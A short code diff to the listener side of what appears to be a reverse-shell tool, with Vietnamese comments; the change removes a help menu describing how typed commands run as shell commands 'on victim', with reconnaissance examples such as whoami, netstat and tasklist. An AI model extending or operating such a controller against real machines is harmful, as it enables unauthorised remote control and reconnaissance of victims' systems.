@@ -78,11 +78,6 @@ class Listener:
                 if not command:
                     continue
                 
-                # Xử lý lệnh đặc biệt
-                if command.lower() == 'help':
-                    self.show_help()
-                    continue
-                
                 if command.lower() in ['exit', 'quit']:
                     print("[*] Closing connection...")
                     self.connection.send(b'exit')
@@ -107,32 +102,6 @@ class Listener:
         
         self.cleanup()
     
-    def show_help(self):
-        """Hiển thị help"""
-        help_text = """
-╔════════════════════════════════════════════════════════════╗
-║                    AVAILABLE COMMANDS                       ║
-╠════════════════════════════════════════════════════════════╣
-║                                                            ║
-║  help              - Show this help message                ║
-║  clear             - Clear screen                          ║
-║  exit / quit       - Close connection and exit             ║
-║                                                            ║
-║  [Any command]     - Execute shell command on victim       ║
-║                                                            ║
-║  Examples:                                                 ║
-║    whoami          - Get current user                      ║
-║    dir / ls        - List directory                        ║
-║    cd <path>       - Change directory                      ║
-║    ipconfig        - Get network info (Windows)            ║
-║    ifconfig        - Get network info (Linux)              ║
-║    netstat -an     - Show network connections              ║
-║    tasklist        - List processes (Windows)              ║
-║    ps aux          - List processes (Linux)                ║
-║                                                            ║
-╚════════════════════════════════════════════════════════════╝
-"""
-        print(help_text)
     
     def cleanup(self):
         """Dọn dẹp kết nối"""
